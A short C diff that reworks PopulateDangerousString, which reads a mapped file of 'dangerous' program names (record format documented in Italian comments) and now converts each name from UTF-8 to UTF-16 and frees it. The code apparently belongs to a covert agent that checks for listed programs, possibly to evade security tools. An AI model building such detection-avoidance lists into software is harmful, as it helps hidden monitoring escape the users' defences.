@@ -51,6 +51,7 @@ void PopulateDangerousString(rcs_struct_t *rcs_info)
 	WCHAR bl_path[MAX_PATH];
 	char *bl_map, *ptr;
 	WCHAR *w_ptr;
+	WCHAR *temp_name = NULL;
 
 	bl_program_count = 0;
 	
@@ -67,9 +68,8 @@ void PopulateDangerousString(rcs_struct_t *rcs_info)
 	if ( (bl_map = (char *)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
 		for(ptr = bl_map; ptr && bl_program_count < MAX_BL_PROGRAM_COUNT;) {
 
-			WCHAR temp_name[MAX_BL_PROGRAM_NAME];
-
-			_snwprintf_s(temp_name, MAX_BL_PROGRAM_NAME, _TRUNCATE, L"%S", ptr);
+			if (!(temp_name = UTF8_2_UTF16(ptr)))
+				break;
 			
 			// Formato A|B|C|D|Nome\r\n
 			// A = Versione (numero, 1 byte)
@@ -104,6 +104,7 @@ void PopulateDangerousString(rcs_struct_t *rcs_info)
 				}
 			}
 
+			SAFE_FREE(temp_name);
 			if (ptr = strchr(ptr, '\n')) 
 				ptr++;
 		}
